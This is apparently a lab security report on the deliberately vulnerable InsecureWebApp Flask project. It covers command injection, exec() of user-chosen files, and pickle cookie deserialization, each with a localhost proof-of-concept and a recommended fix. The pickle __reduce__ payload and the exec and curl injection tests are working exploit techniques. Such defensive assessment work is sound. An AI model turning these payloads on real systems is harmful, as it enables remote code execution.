@@ -1,0 +1,295 @@
+First 3 Vulnerabilities - Code Excerpts, Tests, Confirmation and Fixes
+=====================================================================
+
+Project: InsecureWebApp
+Repository: https://github.com/kadraman/InsecureWebApp
+Local path: /home/carlos/DSS/InsecureWebApp
+
+Scope
+-----
+This document covers the first 3 vulnerabilities from IMPORTANT_VULNERABILITIES.txt:
+
+1. Command Injection via OS command execution
+2. Dynamic code execution with exec()
+3. Insecure deserialization using pickle from remember-me cookie
+
+All tests below were performed only against the local lab instance:
+
+    http://127.0.0.1:5000
+
+Start command used locally:
+
+    cd /home/carlos/DSS/InsecureWebApp
+    ./run-local.sh
+
+
+1. Command Injection via OS command execution
+=============================================
+
+File:
+    iwa/blueprints/insecure/insecure_routes.py
+
+Affected lines:
+    80-86
+
+SAST detection:
+    Bandit:  B605 - Starting a process with a shell, possible injection detected
+    Semgrep: python.lang.security.dangerous-system-call.dangerous-system-call
+
+Affected code excerpt:
+
+    80  @insecure_bp.route("/command_injection", methods = ["GET"])
+    81  def command_injection():
+    82      arguments = request.args.get('arguments')
+    83      home = os.getenv('APPHOME')
+    84      logger.debug("Using home directory: {home}")
+    85      cmd = home.join(INITCMD).join(arguments)
+    86      os.system(cmd);
+
+Why it is vulnerable:
+    User-controlled input from the URL parameter `arguments` is used to build an operating system command.
+    The command is then passed to `os.system()`, which is a dangerous command execution sink.
+    If this command construction worked as intended, an attacker could inject shell commands.
+
+Test performed:
+
+    rm -f /tmp/iwa_cmd_poc
+    curl -i "http://127.0.0.1:5000/insecure/command_injection?arguments=touch%20/tmp/iwa_cmd_poc"
+    test -f /tmp/iwa_cmd_poc && echo created || echo not_created
+
+Observed result:
+
+    HTTP/1.1 500 INTERNAL SERVER ERROR
+    AttributeError: 'NoneType' object has no attribute 'join'
+    /tmp/iwa_cmd_poc was not created
+
+Confirmation:
+    The route crashed before reaching useful command execution because `APPHOME` was not set, so `home` was None.
+    However, the SAST finding is still valid because the code pattern sends constructed command data to `os.system()`.
+    This is a dangerous pattern and should be remediated even if the current runtime path is defective.
+
+Recommended fix:
+    - Do not use `os.system()`.
+    - Do not concatenate or join user input into shell commands.
+    - Use `subprocess.run()` with `shell=False`.
+    - Prefer an allowlist of fixed commands/actions.
+
+Example safer approach:
+
+    import subprocess
+    from flask import abort
+
+    ALLOWED_COMMANDS = {
+        "status": ["/usr/bin/uptime"],
+        "disk": ["/usr/bin/df", "-h"],
+    }
+
+    @insecure_bp.route("/command_injection", methods=["GET"])
+    def command_injection():
+        action = request.args.get("action", "status")
+        command = ALLOWED_COMMANDS.get(action)
+        if command is None:
+            abort(400, "Unsupported command")
+
+        result = subprocess.run(
+            command,
+            capture_output=True,
+            text=True,
+            check=False,
+            shell=False,
+            timeout=5,
+        )
+        return result.stdout, 200, {"Content-Type": "text/plain"}
+
+
+2. Dynamic Code Execution with exec()
+=====================================
+
+File:
+    iwa/blueprints/insecure/insecure_routes.py
+
+Affected lines:
+    149-152
+
+Related route lines:
+    67-72
+
+SAST detection:
+    Bandit:  B102 - Use of exec detected
+    Semgrep: python.lang.security.audit.exec-detected.exec-detected
+
+Affected code excerpt:
+
+    149 def source(script_path):
+    150     with open(script_path, 'r') as script_file:
+    151         script_contents = script_file.read()
+    152         exec(script_contents)
+
+Relevant route excerpt:
+
+    67  @insecure_bp.route("/load_file", methods = ["GET"])
+    68  def load_file():
+    69      filename = request.args.get('filename')
+    70      contents = source(filename)
+    71      response = make_response(contents, 200)
+    72      response.mimetype = "text/plain"
+
+Why it is vulnerable:
+    The application accepts a file path from the `filename` query parameter, reads that file, and executes its contents as Python code using `exec()`.
+    If an attacker can control the file path or place a file on the system, this can lead to arbitrary Python code execution.
+
+Test performed:
+
+    cat > /tmp/iwa_exec_poc.py <<'EOF'
+    open("/tmp/iwa_exec_was_here", "w").write("exec worked")
+    EOF
+
+    curl "http://127.0.0.1:5000/insecure/load_file?filename=/tmp/iwa_exec_poc.py"
+    cat /tmp/iwa_exec_was_here
+
+Observed result:
+
+    The Flask route returned an error:
+
+        TypeError: The view function for 'insecure.load_file' did not return a valid response.
+
+    But the proof file was created successfully:
+
+        cat /tmp/iwa_exec_was_here
+        exec worked
+
+Confirmation:
+    The exploit worked. The application executed the Python code from `/tmp/iwa_exec_poc.py`.
+    The later Flask error happened because `exec()` returns None, so `make_response(None, 200)` failed.
+    The code execution had already happened before the crash.
+
+Recommended fix:
+    - Remove `exec()` completely.
+    - Never execute file contents supplied by user-controlled input.
+    - If the intended feature is to display file content, read and return text only from a safe directory.
+    - Validate and normalize paths to prevent path traversal.
+
+Example safer approach:
+
+    from pathlib import Path
+    from flask import abort
+
+    BASE_DIR = Path("/home/carlos/DSS/InsecureWebApp/safe_files").resolve()
+
+    def source(script_path):
+        requested = (BASE_DIR / script_path).resolve()
+        if not str(requested).startswith(str(BASE_DIR)):
+            abort(400, "Invalid path")
+        if not requested.is_file():
+            abort(404, "File not found")
+        return requested.read_text(encoding="utf-8", errors="replace")
+
+
+3. Insecure Deserialization using pickle from remember-me cookie
+================================================================
+
+File:
+    iwa/blueprints/auth/auth_routes.py
+
+Affected lines:
+    22, 86-94
+
+SAST detection:
+    Bandit:  B403 - Import of pickle module
+    Bandit:  B301 - Pickle deserialization of untrusted data
+    Semgrep: python.lang.security.deserialization.pickle.avoid-pickle
+
+Affected code excerpt:
+
+    20  import base64
+    21  import logging
+    22  import pickle
+
+    86  if 'rememberme' in request.cookies:
+    87      # found 'rememberme' cookie, extract its details
+    88      b64 = request.cookies.get('rememberme')
+    89      a = pickle.loads(base64.b64decode(b64))
+    90      # store the email in a new session and navigate to users home
+    91      session.clear()
+    92      session["email"] = a.email
+    93      session['loggedin'] = True
+    94      return redirect(url_for("users.home"))
+
+Why it is vulnerable:
+    The application reads the `rememberme` cookie from the client and passes it to `pickle.loads()`.
+    Pickle is unsafe for untrusted data because deserialization can execute arbitrary code.
+    Since cookies are client-controlled, an attacker can provide a malicious pickle payload.
+
+Test performed:
+
+    python - <<'PY'
+    import pickle, base64, os
+
+    class Payload:
+        def __reduce__(self):
+            return (os.system, ("echo pickle worked > /tmp/iwa_pickle_poc",))
+
+    print(base64.b64encode(pickle.dumps(Payload())).decode())
+    PY
+
+    curl -i \
+      --cookie "rememberme=PASTE_BASE64_HERE" \
+      "http://127.0.0.1:5000/auth/login"
+
+    cat /tmp/iwa_pickle_poc
+
+Observed result:
+
+    The Flask route returned an error:
+
+        AttributeError: 'int' object has no attribute 'email'
+
+    But the proof file was created successfully:
+
+        cat /tmp/iwa_pickle_poc
+        pickle worked
+
+Confirmation:
+    The exploit worked. The payload executed during `pickle.loads()` and created `/tmp/iwa_pickle_poc`.
+    The later crash happened because `os.system()` returns an integer exit code, so the variable `a` became an int instead of the expected object with an `email` attribute.
+    The code execution had already happened before the crash.
+
+Recommended fix:
+    - Do not use pickle for client-controlled data.
+    - Use Flask's signed session mechanism or a signed JSON token.
+    - If a remember-me token is required, sign it and validate it before use.
+
+Example safer approach using itsdangerous:
+
+    from itsdangerous import URLSafeSerializer, BadSignature
+    from flask import current_app, abort
+
+    serializer = URLSafeSerializer(current_app.config["SECRET_KEY"], salt="rememberme")
+
+    if "rememberme" in request.cookies:
+        token = request.cookies.get("rememberme")
+        try:
+            data = serializer.loads(token)
+        except BadSignature:
+            abort(400, "Invalid remember-me token")
+
+        session.clear()
+        session["email"] = data["email"]
+        session["loggedin"] = True
+        return redirect(url_for("users.home"))
+
+Summary
+=======
+
+The runtime tests confirmed exploitation for:
+
+    - Dynamic code execution with exec()
+    - Insecure deserialization with pickle
+
+The command injection issue was confirmed as a valid SAST finding because user input reaches `os.system()`, but the local runtime test crashed before execution due to a separate implementation bug involving `APPHOME` being None.
+
+Recommended final remediation priority:
+
+    1. Remove `exec()` and safely read files only from an allowed directory.
+    2. Replace pickle-based cookies with signed JSON/session tokens.
+    3. Replace `os.system()` with fixed allowlisted commands using `subprocess.run(..., shell=False)`.
